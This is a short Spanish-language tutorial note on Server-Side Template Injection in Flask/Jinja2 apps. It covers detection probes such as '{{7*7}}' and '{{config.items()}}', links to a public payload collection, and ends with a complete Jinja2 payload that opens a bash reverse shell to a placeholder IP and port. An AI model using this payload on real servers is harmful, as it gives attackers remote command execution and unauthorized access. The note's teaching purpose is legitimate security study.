-----
- Tags: #ataques #basico #teoria #practica
----

# ¿ Que es un **SSTI** ?

Un **Server-Side Template Injection** ( **SSTI** ) es una vulnerabilidad de seguridad en la que un atacante puede inyectar código malicioso en una **plantilla** de servidor. 

Las **plantillas** de servidor son archivos que contienen código que se utiliza para generar *contenido dinámico* en una aplicación web. Los atacantes puede aprovechar una vulerabilidad **SSTI** para inyectar código malicioso en una platinllar de servidor, lo que les pertmite ejecutar comandos en el servidor y obtener acceso no autorizado tanto a la apliación web como a posibles datos sensibles. 

----

# Explotación 

Cuando solemos ver que un campo que ingresamos, sea de formulario o url, es representado en el output de la página web y sabemos que por detras corre un framework o plantilla como **Django**, **Flask**, **Ruby on Rails**, entre otros, podemos empezar a pensar en un **SSTI**, pudiendo sacar posibles comandos a inyectar de páginas como [Payload All The Things](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection).

De esta manera, supongamos que tenemos decubrimos con **whatweb** o **wapalyzer** que nuestra aplicación corre Flask, ingresamos a la app y vemos que tenemos un campo:

![[SSTI_Example.png]]

El cual vemos que se representa en el output: 

![[SSTI_Example2.png]]

Podemos empezar a probar cosas, en este caso probando inputs como `{{7*7}}`, `{{config.items()}}`, entre otros.  (Todos obtenidos de la sección de [python](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2) de [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)), en caso de que veamos un output esperado ante estos payloads, podriamos verificar si se logran ejecutar comandos del sistema con el payload para realizarlo, y en caso de que si, solo quedaria ganar acceso con algun metodo dentro de las [[Shells]]. 

Ejemplo **{% raw %}{{ self.__init__.__globals__.__builtins__.__import__('os').popen('bash -c "bash -i >& /dev/tcp/{ip}/{port} 0>&1"').read() }}{% endraw %}**
